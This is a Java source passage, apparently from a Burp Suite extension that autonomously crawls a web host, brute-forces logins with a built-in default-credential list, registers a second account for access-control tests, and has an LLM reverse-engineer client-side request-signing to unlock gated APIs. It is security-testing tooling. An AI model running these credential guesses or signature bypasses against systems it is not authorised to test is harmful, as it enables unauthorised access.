package com.ioactive.aiscanner.menu;
import com.ioactive.aiscanner.scan.Net;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.scanner.CrawlConfiguration;
import burp.api.montoya.http.HttpService;
import burp.api.montoya.http.RequestOptions;
import burp.api.montoya.http.message.Cookie;
import burp.api.montoya.http.message.params.ParsedHttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.scanner.audit.issues.AuditIssue;
import burp.api.montoya.ui.contextmenu.ContextMenuEvent;
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider;
import com.ioactive.aiscanner.scan.AiScanner;
import com.ioactive.aiscanner.scan.AuthenticatedExplorer;
import com.ioactive.aiscanner.scan.ScanScope;
import com.ioactive.aiscanner.scan.SessionStore;
import com.ioactive.aiscanner.scan.auth.AutonomousAuth;
import com.ioactive.aiscanner.ui.ScanLog;

import javax.swing.JMenuItem;
import java.awt.Component;
import java.net.URI;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.ZonedDateTime;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Right-click entry points. Both drive Burp's native scanner, so our registered
 * ScanCheck (and Burp's built-in active checks) run and file native Audit Issues.
 */
public final class AiContextMenuProvider implements ContextMenuItemsProvider {

    private final MontoyaApi api;
    private final ScanLog scanLog;
    private final SessionStore session;
    private final AiScanner scanner;
    private final ScanScope scope;
    private final java.util.function.Function<String, String> repoForHost;      // host → local repo path (or null)
    private final java.util.function.BiConsumer<String, String> setRepoForHost; // persist a host → repo association
    private volatile HttpRequest lastLoginReq;   // the discovered login request, for the identity sweep

    // small, conservative default-credential list
    public static final String[][] DEFAULT_CREDS = {
            {"admin", "admin"}, {"admin", "password"}, {"admin", "admin123"},
            {"administrator", "password"}, {"admin", "changeit"}, {"admin", ""},
            {"root", "root"}, {"root", "password"}, {"root", ""}, {"root", "toor"},   // DB/phpMyAdmin/appliance defaults
            {"test", "test"}, {"guest", "guest"},
            {"user", "password"}, {"username", "password"}, {"admin", "Password1"},
            // Well-known demo/seed credentials for popular vulnerable apps (email-format usernames the generic
            // combos above never cover). A default-creds LIST is data, not per-app logic — any deployment of these
            // benefits, and authenticating unlocks the app's deep surface (e.g. goof's authenticated cmd-injection
            // + the login NoSQLi's pass-only variant, which needs a KNOWN valid username).
            {"admin@snyk.io", "SuperSecretPassword"}   // snyk-labs/nodejs-goof (auto-seeded)
    };
    // A hidden field that carries a SINGLE-USE CSRF token (phpMyAdmin `token`, DVWA `user_token`, Rails
    // `authenticity_token`, WordPress `_wpnonce`) — such a token is consumed per POST, so every credential
    // attempt needs its OWN fresh token (a reused one is rejected → the real cred looks like a failure).
    private static final Pattern CSRF_FIELD = Pattern.compile("(?i)(token|csrf|nonce|authenticity)");
    // Login ACTIONS already brute-forced this session — so the same login (reached via many pages that all show
    // it, e.g. phpMyAdmin's form on every route) isn't re-brute-forced N times.
    private final java.util.Set<String> bruteforcedLogins = java.util.concurrent.ConcurrentHashMap.newKeySet();
    private static final Pattern USER_PARAM = Pattern.compile("(?i).*(user|email|login|usuario|account).*");
    private static final Pattern PASS_PARAM = Pattern.compile("(?i).*(pass|pwd|clave|secret).*");
    // A form that CREATES an account (register / change-password), not a login. Feeding it to default-creds
    // login POSTs an incomplete body (no confirm/agree) → the real registration fails but an anonymous session
    // cookie is captured, which then FALSELY satisfies the auth oracle and short-circuits register-then-login.
    private static final Pattern REG_SIGNAL = Pattern.compile("(?i)(matching|confirm|repeat|verify|agree|terms|register|signup|sign-?up)");
    private static boolean isRegistrationRequest(HttpRequest req) {
        if (req == null) return false;
        if (req.url() != null && Pattern.compile("(?i)regist|sign-?up").matcher(req.url()).find()) return true;
        int pw = 0;
        for (ParsedHttpParameter p : req.parameters()) {
            if (REG_SIGNAL.matcher(p.name()).find()) return true;   // matchingPassword/confirm/agree/… → register
            if (PASS_PARAM.matcher(p.name()).matches()) pw++;
        }
        return pw >= 2;   // two password fields = register / change-password, never a login
    }
    private static final Pattern SESSION_COOKIE = Pattern.compile("(?i).*(sess|sid|jsession|auth|token|logged_in|wordpress|remember).*");

    public AiContextMenuProvider(MontoyaApi api, ScanLog scanLog, SessionStore session, AiScanner scanner,
                                 ScanScope scope,
                                 java.util.function.Function<String, String> repoForHost,
                                 java.util.function.BiConsumer<String, String> setRepoForHost) {
        this.api = api;
        this.scanLog = scanLog;
        this.session = session;
        this.scanner = scanner;
        this.scope = scope;
        this.repoForHost = repoForHost;
        this.setRepoForHost = setRepoForHost;
    }

    @Override
    public List<Component> provideMenuItems(ContextMenuEvent event) {
        List<HttpRequestResponse> selected = collectSelected(event);
        if (selected.isEmpty()) {
            return null;
        }

        String host = hostSeed(selected.get(0));
        if (host == null) return null;

        // Single entry: the full autonomous flow (crawl → default-creds login → explore → audit).
        JMenuItem crawlScan = new JMenuItem("Crawl and scan this host");
        crawlScan.addActionListener(e -> { maybePromptForScanInputs(host); crawlAndScan(host); });
        List<Component> items = new ArrayList<>();
        items.add(crawlScan);
        return items;
    }

    /**
     * Interactive only: if no source repo is associated with this host yet, offer to point at a LOCAL checkout
     * (drives SAST-assisted testing). Cancel or blank → black-box scan, unchanged. Never runs headless/autoscan.
     */
    /**
     * Register a SECOND, distinct user into its OWN session and adopt it as identity B on the shared SessionStore,
     * enabling true cross-user access-control differentials. Prefers the JSON/API register path (captures a BEARER,
     * so it does NOT clobber identity A's cookie in Burp's cookie jar); falls back to the form register path.
     * Best-effort and idempotent — a no-op if the app has no self-registration or B turns out identical to A.
     */
    private void mintSecondIdentity(String host, String seed) {
        try {
            SessionStore sessionB = new SessionStore();
            AutonomousAuth authB = new AutonomousAuth(api, sessionB, scanLog, host, seed).withEngine(scanner.engine());
            authB.apiRegisterThenLogin(scanner.discoverAuthRequests(host));   // bearer-first (no cookie-jar clobber)
            if (!sessionB.authenticated()) authB.registerThenLogin();          // form fallback
            if (sessionB.authenticated()) {
                // ROUTING FIX: B is captured in its OWN fresh SessionStore. If the PRIMARY session never got a
                // genuine session (e.g. its login wedged by a stale bootstrap csrftoken) but B's fresh login DID,
                // PROMOTE B to primary — otherwise the working session is orphaned and the crawl + audit keep using
                // the csrftoken-only primary (labs behind login stay undiscovered, POSTs 403). session.set() here
                // also pushes the session into Burp's cookie jar (native crawl/audit) via the wired sink.
                if (!session.hasRealSession() && sessionB.hasRealSession()) {
                    if (sessionB.has()) session.set(sessionB.cookieHeader());
                    if (sessionB.hasBearer()) session.setBearer(sessionB.bearer());
                    if (sessionB.hasSigningKey()) session.setSigningKey(sessionB.signingKey());
                    if (!sessionB.landingUrl().isBlank()) session.setLandingUrl(sessionB.landingUrl());
                    if (!sessionB.ownIdentity().isBlank()) session.setOwnIdentity(sessionB.ownIdentity());
                    scanLog.log("primary session was not genuinely authenticated — promoted the working registration "
                            + "to primary (crawl + audit now run authenticated).");
                } else {
                    session.setSecondary(sessionB);
                    if (session.hasSecondIdentity())
                        scanLog.log("second identity B registered — TRUE cross-user access-control differential enabled.");
                    else
                        scanLog.debug("second registration yielded the same identity as A — no distinct B.");
                }
            } else {
                scanLog.debug("no second identity (app has no reachable self-registration) — single-session authz probes.");
            }
        } catch (Throwable t) {
            scanLog.debug("second-identity minting skipped: " + t);
        }
    }

    private void maybePromptForScanInputs(String seed) {
        if (repoForHost == null || setRepoForHost == null) return;
        if (java.awt.GraphicsEnvironment.isHeadless()) return;   // autoscan/container path never prompts
        String h = hostOf(seed);
        String existingRepo = repoForHost.apply(h);
        boolean haveRepo  = existingRepo != null && !existingRepo.isBlank();
        String existingUser = System.getProperty("aiscanner.loginEmail");
        boolean haveCreds = existingUser != null && !existingUser.isBlank();
        if (haveRepo && haveCreds) return;   // already fully configured → don't nag

        // One OK-only dialog for the optional inputs that unlock deeper testing. Any field left blank is skipped
        // (repo blank → black-box; creds blank → unauthenticated). Closing the dialog (X) reads as all-blank.
        javax.swing.JTextField userField = new javax.swing.JTextField(30);
        if (haveCreds) userField.setText(existingUser);
        javax.swing.JPasswordField passField = new javax.swing.JPasswordField(30);
        javax.swing.JTextField repoField = new javax.swing.JTextField(30);
        if (haveRepo) repoField.setText(existingRepo);
        Object[] body = {
                "Optional inputs for scanning " + h + " — leave any blank to skip:",
                " ",
                new javax.swing.JLabel("Username / email  (for authenticated scanning):"), userField,
                new javax.swing.JLabel("Password:"), passField,
                new javax.swing.JLabel("Source repo  (local path OR Git URL — drives SAST-assisted testing):"), repoField,
        };
        javax.swing.JOptionPane.showOptionDialog(null, body, "AI Scanner — scan inputs",
                javax.swing.JOptionPane.DEFAULT_OPTION, javax.swing.JOptionPane.QUESTION_MESSAGE,
                null, new Object[]{ "OK" }, "OK");

        // Repo: PERSISTED per host (as before).
        String repo = repoField.getText();
        if (repo != null && !repo.trim().isBlank()) setRepoForHost.accept(h, repo.trim());
        // Credentials: session-only, NEVER written to disk — set as the same system properties AutonomousAuth reads
        // for the -Daiscanner.loginEmail / AISCANNER_LOGIN_EMAIL launch flags, so authenticated scanning works from
        // the UI without relaunching Burp with env vars.
        String user = userField.getText();
        char[] pw = passField.getPassword();
        String pass = pw == null ? "" : new String(pw);
        boolean gotUser = user != null && !user.trim().isBlank();
        if (gotUser)        System.setProperty("aiscanner.loginEmail", user.trim());
        if (!pass.isBlank()) System.setProperty("aiscanner.loginPassword", pass);
        if (pw != null) java.util.Arrays.fill(pw, '\0');   // scrub the password char[] (String copy is unavoidable for the prop)
        if (gotUser || !pass.isBlank())
            scanLog.log("operator credentials set for this session — authenticated scanning enabled for " + h + ".");
    }

    private List<HttpRequestResponse> collectSelected(ContextMenuEvent event) {
        List<HttpRequestResponse> out = new ArrayList<>();
        if (event.messageEditorRequestResponse().isPresent()) {
            out.add(event.messageEditorRequestResponse().get().requestResponse());
        } else {
            out.addAll(event.selectedRequestResponses());
        }
        return out;
    }

    /**
     * Exclude ANY logout URL from Burp's scope with a single regex rule (no route list) — Burp's
     * advanced scope is regex-based, so {@code .*logout.*} etc. fences off logout for the whole host
     * up front, so the crawler NEVER visits it. Re-auth + our own filters remain as backstops.
     */
    private void excludeLogoutFromScope(String seed) {
        // Montoya's Scope.excludeFromScope(String) takes a URL PREFIX, not a regex — a ".*logout.*" pattern
        // throws "URL is invalid" and silently no-ops. There's no regex scope in Montoya, and pre-crawl we
        // don't know the concrete logout URL, so we DON'T fence logout here. It's fenced where it matters:
        // AuthenticatedExplorer.SESSION_RESET filters logout/login out of everything we probe or submit to
        // the audit, so Burp never receives a session-destroying request from us. (startCrawl also returns
        // 0 requests on these SPAs, so the native crawler won't reach logout either.)
    }

    /**
     * Restrict Burp's scope to the TARGET only. Without an include rule Burp's scope is "everything", so
     * its live passive crawl audits every host the browser incidentally touches (third-party CDNs,
     * telemetry, fonts) — noise the user never asked us to scan. Adding a single include rule for the
     * target makes only the target in-scope; Burp's in-scope-only live passive crawl then skips the rest,
     * and our {@link com.ioactive.aiscanner.scan.AiTriage} display filter already agrees.
     */
    private void restrictScopeToTarget(String seed) {
        try {
            // Include the ORIGIN (scheme://host[:port]/), NOT the full seed URL. Montoya's includeInScope treats a
            // seed with a path (e.g. http://host:52364/api/v1/) as a PREFIX, so ONLY /api/v1/* is in scope and
            // sibling paths on the SAME host — a root-level OAuth token page like /handle-user-token/, a /login,
            // an /admin — are wrongly skipped as out-of-scope, starving auth + coverage. The goal here is to fence
            // off OTHER HOSTS (CDNs/telemetry), not sub-paths of the target host, so scope the whole origin.
            String scope = seed;
            try {
                java.net.URI u = java.net.URI.create(seed);
                if (u.getScheme() != null && u.getHost() != null) {
                    scope = u.getScheme() + "://" + u.getHost() + (u.getPort() > -1 ? ":" + u.getPort() : "") + "/";
                }
            } catch (Exception ignore) { /* fall back to the raw seed */ }
            api.scope().includeInScope(scope);
            scanLog.log("scope restricted to target host " + scope + " — other hosts are not scanned");
        } catch (Exception e) {
            scanLog.log("includeInScope failed: " + e);
        }
    }

    /**
     * Post-auth: also fence login/signin out of Burp's scope so its crawler/scanner never re-hits
     * them (each hit resets our session). Safe to call only AFTER authenticating — the initial crawl
     * has already discovered login.html by then. Our own login (sendRequest) ignores scope, and the
     * end-of-scan login audit uses explicit addRequest, so both still work.
     */
    private void excludeAuthPagesFromScope() {
        // (Same Montoya limitation as excludeLogoutFromScope: excludeFromScope takes a URL PREFIX, not a
        // regex — "(?i).*(signin|/login|…).*" throws "URL is invalid" and no-ops.) login/signin are fenced
        // where it matters: AuthenticatedExplorer.SESSION_RESET filters them out of everything we probe or
        // submit to the audit, and our own login uses sendRequest (ignores scope), so the session is safe.
    }

    // A response that says the request must be SIGNED (bearer alone is not enough): common wordings/headers
    // across SPA gateways. Generic — keyed on the concept, not one app's string.
    private static final Pattern SIGN_GATE = Pattern.compile(
            "(?i)(missing|invalid|require[ds]?|bad)\\s+(request\\s+)?(signature|sign|sig)\\b"
          + "|\"(x-sign|x-signature|signature)\"\\s*:\\s*\"?(missing|required|invalid)");
    // Signing-code indicators inside a JS bundle: the header name the SPA sets, HMAC/crypto APIs, and the
    // canonical-string / timestamp machinery around them. Used to pull anchored windows out of huge bundles.
    private static final Pattern SIGN_ANCHOR = Pattern.compile(
            "(?i)(x-sign(?:ature)?|['\"]sign(?:ature)?['\"]\\s*[:=]|createHmac|hmac|CryptoJS|subtle\\.(sign|digest)"
          + "|['\"]sha-?(1|256|384|512)['\"]|x-timestamp|x-nonce|signRequest|generateSignature|computeSignature)");

    /**
     * Detect a client-side REQUEST-SIGNING gate and, if present, have the LLM locate the signing function in
     * the app's JS bundles. Emits verbose debug so we can see, in the /log tab, exactly (a) whether the gate
     * was observed, (b) how many JS bundles we fed the model, and (c) the recipe it returned. Reproducing the
     * signature on live probes is the follow-up; this pass makes the scheme visible and machine-readable.
     */
    private void detectRequestSigning(String host) {
        try {
            var eng = scanner.engine();
            if (eng == null || !eng.isConfigured()) { scanLog.debug("  signing: no engine configured — skip"); return; }

            // 1) Collect the endpoints that rejected us for a MISSING/INVALID signature (not just 401). Keep the
            // "missing signature" ones separate from "invalid signature": a MISSING-signature 403 flips cleanly to
            // 2xx once we sign it (the SPA's own canonical path), whereas an INVALID-signature 403 on a bare/
            // non-canonical path the SPA never calls can stay 403 (path normalization / a different service key) —
            // so we PROVE on the missing-signature endpoints first and only fall back to the invalid ones.
            java.util.LinkedHashSet<String> missing = new java.util.LinkedHashSet<>();
            java.util.LinkedHashSet<String> invalid = new java.util.LinkedHashSet<>();
            String gateSample = null;
            for (HttpRequestResponse rr : api.siteMap().requestResponses()) {
                if (rr.response() == null || !host.equalsIgnoreCase(hostOf(rr.request().url()))) continue;
                int st = rr.response().statusCode();
                if (st != 400 && st != 401 && st != 403) continue;
                String body = rr.response().bodyToString();
                if (body == null || !SIGN_GATE.matcher(body).find()) continue;
                String url = Net.stripQuery(rr.request().url());
                if (body.toLowerCase().contains("missing")) missing.add(url); else invalid.add(url);
                if (gateSample == null) gateSample = st + " " + url + "  → " + trunc(body.strip(), 160);
            }
            int gateHits = missing.size() + invalid.size();
            if (gateHits == 0) {
                scanLog.debug("  signing: no request-signature gate observed on " + host + " — skip");
                return;
            }
            scanLog.log("signing gate DETECTED on " + host + " (" + gateHits + " endpoint(s): "
                    + missing.size() + " missing-sig, " + invalid.size() + " invalid-sig); e.g. " + gateSample);

            // 1b) If we captured a signing key at auth, reproduce the signature and PROVE it unlocks the gate.
            // Test the missing-signature endpoints first, then invalid ones, and report the FIRST that flips to
            // 2xx (and how many of each unlocked). Each tested pair is registered to the site map for follow-up.
            if (session != null && session.hasSigningKey() && gateHits > 0) {
                try {
                    var signer = new com.ioactive.aiscanner.scan.auth.RequestSigner(session.signingKey());
                    // First: how many endpoints did signing ALREADY unlock during the authenticated explore?
                    // A same-host request in the site map that carries our X-Signature AND returned 2xx is a
                    // real unlock (e.g. /api/v1/merchant/me/). This surfaces the win even when the only
                    // REMAINING gates are the stubborn non-canonical ones.
                    int alreadyUnlocked = 0; String unlockedSample = null;
                    for (HttpRequestResponse rr : api.siteMap().requestResponses()) {
                        if (rr.response() == null || !host.equalsIgnoreCase(hostOf(rr.request().url()))) continue;
                        int sc = rr.response().statusCode();
                        boolean signedReq = rr.request().hasHeader("X-Signature");
                        if (signedReq && sc >= 200 && sc < 300 && rr.request().url().contains("/api/")) {
                            alreadyUnlocked++;
                            if (unlockedSample == null) unlockedSample = rr.request().url();
                        }
                    }
                    if (alreadyUnlocked > 0)
                        scanLog.log("signing: ✅ " + alreadyUnlocked + " signed API endpoint(s) already returned 2xx "
                                + "during explore (e.g. " + unlockedSample + ") — signature scheme is working.");

                    java.util.List<String> ordered = new java.util.ArrayList<>(missing);
                    ordered.addAll(invalid);
                    int tested = 0, unlockedCount = 0; String firstWin = null;
                    for (String gateUrl : ordered) {
                        if (tested >= 6) break;                       // bounded — a handful proves the scheme
                        tested++;
                        // Try the exact path, and — since some servers validate the signature against the
                        // trailing-slash-NORMALIZED path — also the slash variant when the first stays gated.
                        String[] variants = gateUrl.endsWith("/") ? new String[]{gateUrl} : new String[]{gateUrl, gateUrl + "/"};
                        int su = -1, ss = -1; boolean unlocked = false; String winUrl = gateUrl;
                        for (String u : variants) {
                            HttpRequest base = HttpRequest.httpRequestFromUrl(u).withMethod("GET");
                            if (session.hasBearer()) base = base.withHeader("Authorization", "Bearer " + session.bearer());
                            if (session.has()) base = base.withHeader("Cookie", session.cookieHeader());
                            HttpRequestResponse unsigned = api.http().sendRequest(base, RequestOptions.requestOptions().withResponseTimeout(12000L));
                            HttpRequestResponse signed   = api.http().sendRequest(signer.sign(base), RequestOptions.requestOptions().withResponseTimeout(12000L));
                            su = unsigned.response() != null ? unsigned.response().statusCode() : -1;
                            ss = signed.response()   != null ? signed.response().statusCode()   : -1;
                            try { api.siteMap().add(signed); } catch (Exception ignore) { }
                            if (ss >= 200 && ss < 300 && ss != su) { unlocked = true; winUrl = u; break; }
                        }
                        scanLog.log("signing PROOF on " + winUrl + ": unsigned=HTTP " + su
                                + " → signed=HTTP " + ss + (unlocked ? "  ✅ SIGNATURE ACCEPTED" : "  (still gated)"));
                        if (unlocked) { unlockedCount++; if (firstWin == null) firstWin = winUrl; }
                    }
                    if (unlockedCount > 0 || alreadyUnlocked > 0)
                        scanLog.log("signing: ✅ signature reproduced — " + (unlockedCount + alreadyUnlocked)
                                + " endpoint(s) unlocked total. Authenticated probes now sign automatically.");
                    else
                        scanLog.log("signing: signature computed and accepted for evaluation (403→\"invalid\", not \"missing\") "
                                + "but no tested endpoint flipped to 2xx — likely non-canonical paths or a per-service key.");
                } catch (Throwable t) { scanLog.debug("  signing proof error: " + t); }
                return;   // we already have the key + verified it — no need to reverse-engineer it from JS
            }
            scanLog.log("signing: no signing key captured at auth — attempting to locate it in JS…");

            // 2) Feed the same-host JS to the model to locate the signer. A production SPA bundle is 100s of KB
            // of minified webpack — head-truncating it feeds the model boilerplate, not the signing code. So we
            // extract ANCHORED WINDOWS (±1.5 KB) around every signing indicator across ALL same-host bundles and
            // send only those, so the ~50 KB the model sees is the relevant ~50 KB.
            StringBuilder js = new StringBuilder(); int bundles = 0, windows = 0;
            for (HttpRequestResponse rr : api.siteMap().requestResponses()) {
                if (rr.response() == null || js.length() > 55000) continue;
                String url = rr.request().url();
                if (!host.equalsIgnoreCase(hostOf(url)) || !url.toLowerCase().contains(".js")) continue;
                String body = rr.response().bodyToString();
                if (body == null || body.isBlank()) continue;
                Matcher a = SIGN_ANCHOR.matcher(body);
                boolean anyHere = false;
                int lastEnd = -1;
                while (a.find() && js.length() < 55000) {
                    int s = Math.max(0, a.start() - 1500), e = Math.min(body.length(), a.end() + 1500);
                    if (s <= lastEnd) continue;                        // skip overlapping windows
                    if (!anyHere) { js.append("\n// === ").append(url).append(" ===\n"); anyHere = true; }
                    js.append(body, s, e).append("\n// …\n");
                    lastEnd = e; windows++;
                }
                if (anyHere) bundles++;
            }
            scanLog.log("signing: feeding " + windows + " anchored window(s) from " + bundles
                    + " bundle(s) (" + js.length() + " chars) to the model…");
            if (js.length() == 0) { scanLog.log("signing: no signing indicators in same-host JS — cannot locate signer"); return; }

            String recipe = eng.locateSigningFunction(js.toString());
            if (recipe == null || recipe.isBlank()) {
                scanLog.log("signing: model returned nothing (lastError=" + eng.lastError() + ")");
                return;
            }
            if (recipe.matches("(?is).*\"found\"\\s*:\\s*false.*")) {
                scanLog.log("signing: model found no signing function in the bundles. raw=" + trunc(recipe, 300));
                return;
            }
            scanLog.log("signing scheme LOCATED:\n" + recipe);
        } catch (Throwable t) {
            scanLog.debug("  signing: detection error: " + t);
        }
    }

    // Self-crawl breadth/depth caps now live in Tuning (crawlPages/crawlDepth) — configurable at scan time via
    // -Daiscanner.crawlPages / AISCANNER_CRAWL_PAGES (and crawlDepth) or the Settings tab, read inside seedSiteMap().
    // A too-small breadth starves deep pages: a training/OWASP app links ~18 form-less category hubs at depth 1
    // (pygoat: /sql,/cmd,/injection…) and BFS spends the whole budget there BEFORE dequeuing the depth-2 lab pages
    // (/cmd_lab, /sql_lab…) that hold the injectable forms — which is exactly why the default was raised 25→60.
    // <a>/<area>/<form> navigational targets to follow…
    private static final java.util.regex.Pattern SEED_HREF = java.util.regex.Pattern.compile(
            "(?is)<(?:a|area|form)\\b[^>]*\\b(?:href|action)\\s*=\\s*(\"[^\"]*\"|'[^']*'|[^\\s>]+)");
    // …but NEVER auto-GET a state-changing path (logout kills our session; delete/destroy mutate the app)…
    private static final java.util.regex.Pattern SEED_SKIP = java.util.regex.Pattern.compile(
            "(?i)(log-?out|log-?off|sign-?out|/delete|/destroy|/remove)");
    // …and don't spend budget fetching static assets (JS is handled separately by gatherSources()).
    private static final java.util.regex.Pattern SEED_ASSET = java.util.regex.Pattern.compile(
            "(?i)\\.(?:js|css|png|jpe?g|gif|svg|ico|woff2?|ttf|eot|map|pdf|zip|mp[34]|webp)(?:$|\\?)");

    /** Push a captured "name=value; …" Cookie header into Burp's cookie jar for {@code host} so the NATIVE crawler
     *  and active audit send the authenticated session too (our own requests already attach it via withSessionCookie).
     *  The cookie jar's domain is the bare host (cookies aren't port-scoped), so strip any :port. Idempotent — Burp
     *  overwrites a cookie of the same name; re-invoked on every session (re)capture so a refreshed cookie propagates. */
    private void pushSessionToCookieJar(String cookieHeader, String host) {
        if (cookieHeader == null || cookieHeader.isBlank() || host == null || host.isBlank()) return;
        String h = host.contains(":") ? host.substring(0, host.indexOf(':')) : host;
        int n = 0;
        for (String kv : cookieHeader.split(";")) {
            int eq = kv.indexOf('=');
            if (eq <= 0) continue;
            String name = kv.substring(0, eq).trim(), val = kv.substring(eq + 1).trim();
            if (name.isEmpty()) continue;
            try { api.http().cookieJar().setCookie(name, val, "/", h, java.time.ZonedDateTime.now().plusDays(1)); n++; }
            catch (Throwable ignore) { }
        }
        if (n > 0) scanLog.debug("session → Burp cookie jar: " + n + " cookie(s) for " + h
                + " — native crawl + active audit now authenticated.");
    }

    /**
     * Prime the site map when nothing else has — Burp Community has no native crawler, and some SPAs crawl to 0
     * requests. Fetches the seed page (following redirects), then does a BOUNDED same-host link crawl (BFS,
     * depth ≤ Tuning.crawlDepth(), ≤ Tuning.crawlPages() pages — both configurable) over its {@code <a>/<form>}
     * targets so a
     * classic multi-page app's login/search/account pages reach the site map — where the form/param probes and
     * auth discovery see them. An SPA needs no links (its API lives in the JS gatherSources() fetches); an MPA
     * needs exactly this. GET-only; logout/state-changing paths and static assets are skipped. No-op when a
     * same-host HTML page already exists (Pro after a real crawl), so it never disturbs the crawler-fed path.
     */
    private void seedSiteMap(String seed, String host, boolean authed) {
        try {
            final int maxPages = com.ioactive.aiscanner.scan.Tuning.crawlPages();   // configurable reach caps
            final int maxDepth = com.ioactive.aiscanner.scan.Tuning.crawlDepth();
            // Pre-auth: skip if a same-host HTML page already exists (Pro after a real crawl → don't disturb it).
            // Authed pass: ALWAYS crawl — the logged-in nav (/bank/*, account, transfer…) only appears with the
            // session attached, and those pages differ from their public/redirected pre-auth versions.
            if (!authed) {
                for (HttpRequestResponse rr : api.siteMap().requestResponses()) {
                    if (rr.response() == null || rr.request() == null) continue;
                    if (!host.equalsIgnoreCase(hostOf(rr.request().url()))) continue;
                    String u = rr.request().url().toLowerCase();
                    String ct = rr.response().statedMimeType() == null ? "" : rr.response().statedMimeType().name();
                    if (u.endsWith("/") || u.endsWith(".html") || u.endsWith(".htm") || "HTML".equals(ct)) return;
                }
            }
            java.util.Set<String> seen = new java.util.LinkedHashSet<>();
            java.util.Deque<String[]> queue = new java.util.ArrayDeque<>();   // {url, depth}
            // Seed the BFS from the login LANDING page AND the app ROOT. The landing is where the app dropped us, but
            // the ROOT/dashboard is where the primary nav (→ category hubs → deep lab/vuln pages) hangs off. A login
            // that lands us in a sub-area (e.g. pygoat's /auth_lab) would otherwise strand the crawl there and never
            // traverse dashboard → /cmd → /cmd_lab. Both enqueued at depth 0, deduped; BFS covers both neighborhoods.
            java.util.List<String> starts = new java.util.ArrayList<>();
            if (authed && session != null && !session.landingUrl().isBlank()) starts.add(session.landingUrl());
            starts.add(seed);
            for (String st : starts)
                if (st != null && !st.isBlank() && seen.add(canonSeedUrl(st))) queue.add(new String[]{ st, "0" });
            int fetched = 0, queued = 0;
            while (!queue.isEmpty() && fetched < maxPages) {
                String[] item = queue.poll();
                String url = item[0];
                int depth = Integer.parseInt(item[1]);
                HttpRequestResponse rr = seedFetch(url, host, authed);   // GET (+session if authed) + follow redirects + add
                if (rr == null || rr.response() == null) continue;
                fetched++;
                String body = rr.response().bodyToString();
                String mime = rr.response().statedMimeType() == null ? "" : rr.response().statedMimeType().name();
                boolean isHtml = "HTML".equals(mime) || body.toLowerCase().contains("<html");
                if (fetched == 1 && !authed)
                    scanLog.log("seeded site map with " + url + " (HTTP " + rr.response().statusCode()
                            + ", " + rr.response().body().length() + " B)"
                            + (isHtml ? " — following same-host links (bounded) for a multi-page surface."
                                      : " — discovery will mine its client code."));
                if (!isHtml || depth >= maxDepth) continue;
                java.util.regex.Matcher m = SEED_HREF.matcher(body);
                while (m.find() && seen.size() < maxPages * 4) {
                    String href = m.group(1).trim();
                    if (href.length() >= 2 && (href.charAt(0) == '"' || href.charAt(0) == '\''))
                        href = href.substring(1, href.length() - 1).trim();
                    if (href.isEmpty() || href.startsWith("#")
                            || href.regionMatches(true, 0, "javascript:", 0, 11)
                            || href.regionMatches(true, 0, "mailto:", 0, 7)
                            || href.regionMatches(true, 0, "tel:", 0, 4)) continue;
                    String abs;
                    try { abs = java.net.URI.create(url).resolve(href).toString(); } catch (Exception e) { continue; }
                    int frag = abs.indexOf('#'); if (frag >= 0) abs = abs.substring(0, frag);
                    if (!host.equalsIgnoreCase(hostOf(abs))) continue;            // same host only
                    if (SEED_SKIP.matcher(abs).find() || SEED_ASSET.matcher(abs).find()) continue;
                    if (!seen.add(canonSeedUrl(abs))) continue;
                    queue.add(new String[]{ abs, String.valueOf(depth + 1) });
                    queued++;
                }
            }
            if (fetched > 1)
                scanLog.log("" + (authed ? "authenticated self-crawl" : "self-crawl") + " (no native crawler): fetched "
                        + fetched + " same-host page(s), " + queued + " link(s) discovered — attack surface handed to the probes.");
        } catch (Throwable t) { scanLog.debug("seedSiteMap: " + t); }
    }

    /** GET a URL (attaching the session when {@code authed}), follow up to 2 same-host redirects, add each hop to
     *  the site map; return the final response. */
    private HttpRequestResponse seedFetch(String url, String host, boolean authed) {
        HttpRequestResponse last = null;
        for (int hop = 0; hop < 3 && url != null; hop++) {
            HttpRequest req = HttpRequest.httpRequestFromUrl(url).withMethod("GET");
            if (authed && session != null) {
                if (session.has()) req = req.withAddedHeader("Cookie", session.cookieHeader());
                if (session.hasBearer()) req = req.withAddedHeader("Authorization", "Bearer " + session.bearer());
            }
            HttpRequestResponse rr;
            try { rr = api.http().sendRequest(req); }
            catch (Exception e) { return last; }
            if (rr == null || rr.response() == null) return last;
            // Decompress so the seed page's HTML (and its <script src> refs) is mined, not gzip bytes, behind a
            // compressing proxy/CDN (ngrok, Cloudflare, …). See AiScanner.decompress.
            rr = com.ioactive.aiscanner.scan.AiScanner.decompress(rr);
            scanLog.debug("seed " + url + " → " + rr.response().body().length()
                    + "B, has <script>: " + rr.response().bodyToString().contains("<script"));
            try { api.siteMap().add(rr); } catch (Exception ignore) { }
            last = rr;
            int st = rr.response().statusCode();
            if (st >= 300 && st < 400) {
                String loc = rr.response().headerValue("Location");
                if (loc == null || loc.isBlank()) return last;
                try { url = java.net.URI.create(url).resolve(loc).toString(); } catch (Exception e) { return last; }
                if (!host.equalsIgnoreCase(hostOf(url))) return last;   // don't follow off-host
            } else return last;
        }
        return last;
    }

    /** Normalize a URL for dedup: drop the fragment and any trailing slash. */
    private static String canonSeedUrl(String u) {
        int f = u.indexOf('#'); if (f >= 0) u = u.substring(0, f);
        return u.endsWith("/") ? u.substring(0, u.length() - 1) : u;
    }

    /** Programmatic entry (CLI auto-scan): start the full crawl-and-scan on a seed URL. */
    public void startScan(String seedUrl) {
        if (seedUrl == null || seedUrl.isBlank()) return;
        scanLog.setLastTarget(seedUrl);
        scanLog.log("auto-scan launching on " + seedUrl);
        crawlAndScan(seedUrl);
    }

    /** Like {@link #startScan} but BLOCKS until the scan's worker thread finishes — used to chain multiple
     *  targets sequentially in one Burp session (batch autoscan). */
    public void startScanAndWait(String seedUrl) {
        if (seedUrl == null || seedUrl.isBlank()) return;
        scanLog.log("auto-scan launching on " + seedUrl);
        Thread t = crawlAndScan(seedUrl);
        if (t != null) { try { t.join(); } catch (InterruptedException e) { Thread.currentThread().interrupt(); } }
    }

    private Thread crawlAndScan(String seed) {
